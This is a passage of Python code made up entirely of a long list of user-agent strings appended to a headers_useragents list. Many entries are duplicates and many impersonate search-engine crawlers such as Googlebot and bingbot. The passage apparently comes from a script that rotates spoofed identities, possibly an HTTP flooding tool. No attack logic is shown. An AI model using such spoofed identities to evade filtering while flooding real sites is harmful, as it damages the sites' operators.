        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible;"
        " +http://www.become.com/site_owners.html)"
    )
    headers_useragents.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    headers_useragents.append(
        "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML,"
        " like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser"
        " 1.98.744; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo"
        " Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;"
        " Avant Browser)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser;"
        " GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1;"
        " .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like"
        " Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like"
        " Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML,"
        " like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
    )
    headers_useragents.append(
        "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML,"
        " like Gecko) Version/7.0.3 Safari/7046A194A"
    )
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)"
    )
    headers_useragents.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (FM Scene 4.6.1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) "
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004"
        " Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none;"
        " freenet DSL 1.1; (none))"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie;"
        " .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like"
        " Gecko) Safari/417.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010"
        " Firefox/1.0.7 (Ubuntu package 1.0.7)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR"
        " 2.0.50727; .NET CLR 3.0.04506.30)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
    headers_useragents.append("Opera/9.20 (Windows NT 6.0; U; en)")
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205"
        " Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR"
        " 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML,"
        " like Gecko) Version/4.0 Safari/528.16"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209"
        " Firefox/3.6.13"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401"
        " Firefox/4.0 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo"
        " Firefox/3.6.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809"
        " Fedora/3.6.7-1.fc14 Firefox/3.6.7"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc"
        " dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
